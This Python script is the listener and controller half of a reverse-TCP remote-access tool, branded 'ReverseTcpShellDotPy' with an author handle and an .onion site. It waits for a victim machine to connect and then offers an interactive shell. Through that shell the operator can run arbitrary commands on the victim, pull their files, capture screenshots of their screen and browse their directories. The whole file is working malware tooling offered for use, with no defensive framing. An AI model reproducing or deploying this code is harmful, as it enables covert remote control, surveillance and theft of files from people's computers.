#!/usr/bin/python3

try:
    import base64, binascii             # importing need libs 
    import libs.clib as clib
    from socket import *
    from PIL import ImageGrab, Image 
except :                                # if system dose does not have any of this libs throw an error
    print("ERROR: Run pip install --user --requirement requirements.txt")


Intro = r"""                            # our intro asci art 

.     .       .  .   . .   .   . .    +  .
  .     .  :     .    .. :. .___---------___.
       .  .   .    .  :.:. _".^ .^ ^.  '.. :"-_. .
    .  :       .  .  .:../:            . .^  :.:\.
        .   . :: +. :.:/: .   .    .        . . .:\
 .  :    .     . _ :::/:               .  ^ .  . .:\
  .. . .   . - : :.:./.                        .  .:\
  .      .     . :..|:                    .  .  ^. .:|
    .       . : : ..||        .                . . !:|
  .     . . . ::. ::\(                           . :)/
 .   .     : . : .:.|.  ####               . ##### ::|
  :.. .  :-  : .:  ::|.#######           ..########:|
 .  .  .  ..  .  .. :\ ########          :######## :/
  .        .+ :: : -.:\ ########       . ########.:/
    .  .+   . . . . :.:\. ######         ######..:/
      :: . . . . ::.:..:.\           .   .   ..:/
   .   .   .  .. :  -::::.\.       | |     . .:/
      .  :  .  .  .-:.":.::.\             ..:/
 .      -.   . . . .: .:::.:.\.           .:/
.   .   .  :      : ....::_:..:\   ___.  :/         
   .   .  .   .:. .. .  .: :.:.:\       :/              
     +   .   .   : . ::. :.:. .:.|\  .:/|           ->  TITLE : ReverseTcpShellDotPy
     .         +   .  .  ...:: ..|  --.:|           ->  Coded : Cy4nGuy
.      . . .   .  .  . ... :..:.."(  ..)"           ->   SITE : cy4nxsbtnk3e5wy5.onion
 .   .       .      :  .   .: ::/  .  .::\          -> GITHUB : github.com/cy4nguy

"""


Server  = socket(AF_INET,SOCK_STREAM)   # setting up a TCP connection 
HOST    = "YOUR IP"                     # our system IP address 
PORT    = 4556                          # random  port that is not in use

Server.bind((HOST, PORT))               # binding IP and port 
Server.listen(1)                        # waiting for the user to connect 

print(clib.text(f"[*] {HOST}:{PORT} > listening").Color())  # if we got connection show target IP

Client, Addr = Server.accept()                              # our client and client info module and accepting the connection 

print(clib.text(Intro).Art())                               #showing our intro art

while True:                                                     #start while True 

    print(clib.text("[*] ServerSHELL > ").Color(), end="")      # ask the user for command 
    Shell_User   = input()                                      # Get the command
    L_Shell_User = Shell_User.split(" ")                        # convert command to list

    if Shell_User == "quit":                                    # if user said quit 
        Client.send(bytes(Shell_User, encoding="utf-8"))        # send quit request to client 
        quit()                                                  # end then quit

    elif L_Shell_User[0] == "file":                             # if user went to get file form client 

        if L_Shell_User[1] == "get":                                    
            Client.send(bytes(Shell_User, encoding="utf-8"))            # send request to client
            FileDate = binascii.a2b_base64(Client.recv(1073741824))     # get file date in base60 
            with open(f"Copy_{L_Shell_User[2]}", "wb") as File:         # save the date in file 
                File.write(FileDate)                                    # write file 

    elif L_Shell_User[0] == "showScreen":                               # if user went to get screnshot form client 
        Client.send(bytes(Shell_User, encoding="utf-8"))                # send request to client 
        FileDate = binascii.a2b_base64(Client.recv(1073741824))         # open file 
        with open(f"Screen.png", "wb") as File: File.write(FileDate)    # save file date as png
        Image.open("Screen.png").show()

    elif L_Shell_User[0] == "help":                                     # if user entred invalid command or asked for help 
        print(r"""
  _        _
 | |_  ___| |_ __ 
 | ' \/ -_) | '_ \
 |_||_\___|_| .__/
            |_|   

                 1 -> file get FILENAME.png | get files form user
                 2 -> command YourCommand   | run command on user 
                 3 -> showScreen            | show screeshot from user
                 4 -> chdir path\somewhare  | change the directory
                 5 -> path                  | show current directory(path)
                 6 -> back                  | Go one directory back
                """)

    else:
        Client.send(bytes(Shell_User, encoding="utf-8"))               # if user didnt entred any command send raw command 
        Client_R   = str(Client.recv(1024), 'utf-8')                   # if user didnt entred any command show raw command 

        print(Client_R)                                                # print client respond 